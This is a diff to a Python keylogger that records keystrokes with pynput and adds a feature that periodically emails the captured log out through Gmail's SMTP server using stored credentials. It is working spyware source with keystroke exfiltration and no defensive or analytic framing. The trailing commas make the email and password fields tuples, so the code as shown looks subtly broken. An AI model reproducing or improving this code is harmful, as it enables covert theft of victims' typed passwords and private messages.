@@ -1,14 +1,27 @@
 #!/usr/bin/env python
 import pynput.keyboard  # allows us to monitor mouse and keyboard
 import threading
-log = ""
+import smtplib
+
 
 class Keylogger:
-    def __init__(self):
-        self.log = ""
+    def __init__(self, time_interval, email, password):
+        self.log = "Keylogger started"
+        self.interval = time_interval
+        self.email = email,
+        self.password = password,
 
     def append_to_log(self, string):
         self.log = self.log + string
+
+    @staticmethod
+    def send_mail(email, password, message):
+        # setting up smtp server. Using google smtp server
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()  # Initiating a tls connection
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
 
     def process_key_press(self, key):
         try:
@@ -22,9 +35,9 @@ class Keylogger:
         self.append_to_log(current_key)
 
     def report(self):
-        print(self.log)
+        self.send_mail(self.email, self.password, "\n\n" + self.log)
         self.log = " "
-        timer = threading.Timer(5, self.report)
+        timer = threading.Timer(self.interval, self.report)
         timer.start()
 
     def start(self):
